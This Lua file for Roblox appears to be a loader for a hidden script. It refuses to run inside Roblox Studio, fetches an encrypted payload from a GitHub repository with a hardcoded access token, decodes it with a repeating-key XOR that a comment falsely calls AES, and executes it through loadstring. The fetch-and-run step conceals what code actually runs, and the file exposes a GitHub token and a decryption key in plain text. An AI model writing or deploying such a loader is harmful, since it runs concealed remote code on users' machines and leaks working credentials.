local config = {
    github_owner = "20120long",
    github_repo = "TiKa_script",
    script_path = "Loder.enc",
    github_token = "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"
}

local function is_valid_environment()
    if not game or not game:GetService("Players") then
        return false, "Not in Roblox environment"
    end
    
    local RunService = game:GetService("RunService")
    if RunService:IsStudio() then
        return false, "Running in development environment"
    end
    
    local success, HttpService = pcall(game.GetService, game, "HttpService")
    if not success or not HttpService then
        return false, "HTTP service not available"
    end
    
    return true
end

local function decrypt_script(encrypted_b64, key)
    local encrypted_data = game:GetService("HttpService"):Base64Decode(encrypted_b64)
    local iv = encrypted_data:sub(1, 16)
    local ciphertext = encrypted_data:sub(17)
    
    local decrypted = ""
    for i = 1, #ciphertext do
        local char_code = string.byte(ciphertext, i) ~ string.byte(key, (i-1) % #key + 1)
        decrypted = decrypted .. string.char(char_code)
    end
    
    local pad_len = string.byte(decrypted, -1)
    if pad_len > 0 and pad_len <= 16 then
        decrypted = decrypted:sub(1, -pad_len-1)
    end
    
    return decrypted
end

local function fetch_encrypted_script()
    local url = string.format(
        "https://api.github.com/repos/%s/%s/contents/%s",
        config.github_owner,
        config.github_repo,
        config.script_path
    )
    
    local headers = {
        ["Authorization"] = "token " .. config.github_token,
        ["Accept"] = "application/vnd.github.v3.raw"
    }
    
    local success, response = pcall(function()
        return game:GetService("HttpService"):GetAsync(url, false, headers)
    end)
    
    if not success then
        warn("Failed to fetch script: " .. tostring(response))
        return nil
    end
    
    return response
end

local function main()
    local valid, reason = is_valid_environment()
    if not valid then
        warn("Environment check failed: " .. reason)
        return
    end
    
    local encrypted_script = fetch_encrypted_script()
    if not encrypted_script then
        warn("Failed to retrieve encrypted script")
        return
    end
    
    local key = "TiKa_AES_pat_2012_03_05_adBmLQ_010"  --AES密钥
    local decrypted_script = decrypt_script(encrypted_script, key)
    
    local func, err = loadstring(decrypted_script)
    if not func then
        warn("Failed to load script: " .. tostring(err))
        return
    end
    
    local success, result = pcall(func)
    if not success then
        warn("Script execution failed: " .. tostring(result))
    end
end

main()